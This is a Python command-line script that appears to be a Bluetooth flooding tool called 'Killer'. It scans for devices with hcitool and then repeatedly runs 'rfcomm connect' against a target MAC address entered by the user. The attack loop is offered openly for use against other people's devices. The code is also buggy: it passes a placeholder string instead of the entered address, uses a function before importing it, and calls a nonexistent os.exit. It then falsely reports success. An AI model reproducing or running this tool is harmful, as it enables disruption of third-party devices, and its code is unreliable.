#===========================================================================
#!/usr/bin env python
import subprocess
import sys
import time
import os
#============================SYSTEM_CHEK====================================
if os.sys.platform == 'win32':
    print(colored(' Error 01 - This script only works on Linux!!!', 'red'))
    time.sleep(5)
    sys.exit(0)
else:
    os.system('clear')

try:
    from termcolor import colored
except ModuleNotFoundError:
    print(colored('Error 02 - No library "termcolor" please run "pip install termcolor" ', 'red'))
    time.sleep(5)
    sys.exit(0)

try:
    from banner import banner
except ModuleNotFoundError:
    print(colored('Error 03 - No File "banner.py" ', 'red'))
    time.sleep(5)
    sys.exit(0) 

try:
    f = open('update.sh')
except IOError:
    print(colored('Error 04 - No File "update.py" ', 'red'))
    time.sleep(5)
    sys.exit(0) 

dev = input(colored('You have Bluetooth module? (Yes/No): ', 'blue'))
if dev == 'Yes':
#==========================START_BANNER=====================================
    os.system('clear')
    print(colored('Loading.', 'red'))
    time.sleep(1)
    os.system('clear')

    print(colored('Loading..', 'yellow'))
    time.sleep(1)
    os.system('clear')

    print(colored('Loading...', 'green'))
    time.sleep(1)
    os.system('clear')

    print(colored('Successfully!', 'green'))
    time.sleep(1)
    os.system('clear')

    banner()
#==========================CONFIG===========================================
    while True:
        print('[1] - scan\n[2] - run\n[3] - info\n[4] - update')
        numb = input('#: ')
        if numb == '1':
            os.system('clear')
            banner()
            print('Search...')
            os.system('hcitool scan')
        
        elif numb == '2':
            os.system('clear')
            banner()
            conf = ['rfcomm','connect','MAC_adress','1']
            MAC_adress = input(colored('MAC_adress : ','blue'))
            thear = int(input(colored('Packages: ','blue')))
        
            print(colored('Connect to '+ MAC_adress +'...','green', attrs=['blink']))
            time.sleep(3)
#==========================START============================================
            for i in range(0, thear):
                subprocess.call(conf)
#==========================EXIT=============================================
            time.sleep(1)
            os.system('clear') 
            print(colored('successfully sent '+ str(thear) +' packages to '+ MAC_adress +'!\nPlease CTRL + Z or Enter to get out','green'))
            input()
            os.exit(0)

        elif numb == '3':
            os.system('clear')
            banner()
            print('Wrote the code Extremmer781\nVK - vk.com/extremmer781\nTelegram - t.me/extremmer781')
        
        elif numb == '4':
            os.system('clear')
            banner()
            update = input(colored('Update Killer? (Yes/No): ', 'blue'))
            if update == 'Yes':
                os.system('clear')
                banner()
                print('The repository will download in ~/ or to your desktop\n(depending on your system)')
                print('Update will start in 10 seconds...')
                time.sleep(10)
                os.system('sh update.sh')
                print('Shutting down the script...')
                time.sleep(5)
                sys.exit(0)
            else:
                os.system('clear')
                banner()
                print('Update rejected')

        else:
            os.system('clear')
            banner()
            print(colored('Bad Command!', 'red'))

elif dev == 'No':
    print(colored('The program requires a Bluetooth module!!!','red', attrs=['blink']))
    time.sleep(5)
    sys.exit(0)

else:
    print(colored('Bad Command!','red'))
    print(colored('Exit...','red'))
    time.sleep(5)
    sys.exit(0) 
#===========================================================================
